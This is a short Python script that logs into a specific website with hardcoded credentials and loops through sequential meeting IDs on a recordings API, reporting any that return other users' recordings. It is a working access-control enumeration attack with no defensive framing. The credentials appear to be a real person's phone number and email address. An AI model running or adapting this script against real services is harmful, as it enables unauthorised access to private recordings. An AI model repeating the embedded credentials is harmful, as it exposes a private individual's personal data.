import requests

session = requests.Session()
# Login to dereceuzem
login_url = "https://dereceuzem.okinar.com/account/login_control"
payload = {
    "username": "5536445851",
    "password": "volkancetin06@hotmail.com"
}
session.post(login_url, data=payload, timeout=10)

print("Testing sequential IDs for dereceuzem...")
for x in range(1, 150):
    mid = f"dereceuzem{x}"
    url = f"https://dereceuzem.okinar.com/api/getRecordings/{mid}"
    try:
        r = session.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            recs = data.get("recordings", {}).get("recording", []) if isinstance(data, dict) else []
            if recs:
                print(f"FOUND recordings for {mid}: {len(recs)} recordings!")
    except Exception as e:
        pass
